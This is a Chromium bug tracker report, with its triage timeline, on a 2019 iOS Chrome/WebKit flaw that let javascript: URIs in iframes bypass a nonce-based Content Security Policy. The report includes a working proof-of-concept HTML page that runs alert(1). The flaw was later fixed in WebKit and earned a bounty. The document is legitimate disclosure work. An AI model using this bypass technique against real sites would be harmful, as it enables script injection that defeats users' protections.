# iOS Chrome javascript: URI nonce based CSP bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [40050505](https://issues.chromium.org/issues/40050505) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Mobile>iOSWeb |
| **Platforms** | iOS |
| **Reporter** | pr...@gmail.com |
| **Assignee** | ga...@google.com |
| **Created** | 2019-10-23 |
| **Bounty** | $3,000.00 |

## Description

Steps to reproduce the problem:
There is CSP bypass issue in iOS Chrome which allows to execute JavaScript through <iframe> and javascript: URI scheme. 

PoC:

jscsp.php:

<!DOCTYPE html>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-whitelist'">

<body>
  Setting location with <code>iframe.contentWindow.location.href</code><br/>
  <iframe id="iframe_href" src="test_frame.html"></iframe>
  <hr>
  Setting location with <code>iframe.src</code><br/>
  <iframe id="iframe_src" src="test_frame.html"></iframe>
  <script nonce="whitelist">
    const iframeHref = document.querySelector("#iframe_href");
    iframeHref.addEventListener('load', () => {
      iframeHref.contentWindow.location.href = "javascript:alert(1)";
    });
    const iframeSrc = document.querySelector("#iframe_src");
    iframeSrc.addEventListener('load', () => {
      iframeSrc.src = "javascript:'FAIL (JS URL executed)'";
    });
  </script>
</body>

Test on: https://pwning.click/jscsp.php

What is the expected behavior?
CSP prevents JavaScript execution

What went wrong?
JavaScript is executed despite the CSP rules.

Did this work before? N/A 

Chrome version:   Channel: stable
OS Version: 10.0
Flash Version:

## Timeline

### jd...@chromium.org (2019-10-23)

Thanks for the report! Does Safari on iOS also have this issue? (Same question, different bug.)

eugenebut@: can you take a look at this one too?

[Monorail components: Blink>SecurityFeature>ContentSecurityPolicy]

### pr...@gmail.com (2019-10-24)

Yes, this also works on iOS Safari.

### sh...@chromium.org (2019-10-24)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-10-24)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### jd...@chromium.org (2019-10-24)

In my experience, I have better luck asking people to take a look if I actually assign it to them.

eugenebut@: can you PTAL at this one, too?

### eu...@chromium.org (2019-10-24)

Reproducible on iOS 13.1.2. proof131072@, by any chance did you file radar or WebKit bug for this vulnerability? There is no workaround for issues like this in Chrome. 

### pr...@gmail.com (2019-10-24)

I reported to apple via sending email to product-security@apple.com.

### eu...@chromium.org (2019-10-24)

Thank you. Ali, Gauthier, I don't think we need to report this problem to Apple again. Marking this bug as ExternalDependency seems like the best way to move forward.

### eu...@chromium.org (2019-10-31)

[Empty comment from Monorail migration]

[Monorail components: -Blink>SecurityFeature>ContentSecurityPolicy Mobile>iOSWeb]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-15)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### pr...@gmail.com (2021-07-10)

Hi, this is ping for this case. Thanks!

### ga...@chromium.org (2021-07-19)

This seems still failing.
This is a WebKit bug. We can't workaround it in Chrome directly.

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### pr...@gmail.com (2022-05-16)

I confirmed this bug was fixed in recent update.

### pr...@gmail.com (2022-05-23)

Ping

### aj...@chromium.org (2022-05-24)

Confirmed, this doesn't reproduce in iOS 15.5. I believe it was fixed by https://commits.webkit.org/r290550

### [Deleted User] (2022-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2022-06-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-06-01)

Congratulations! The VRP Panel has decided to award you $3,000 for this report. Thank you for your efforts in reporting this issue to us and Apple so it could be fixed in WebKit. 

### am...@google.com (2022-06-05)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1017145?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-19)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050505)*
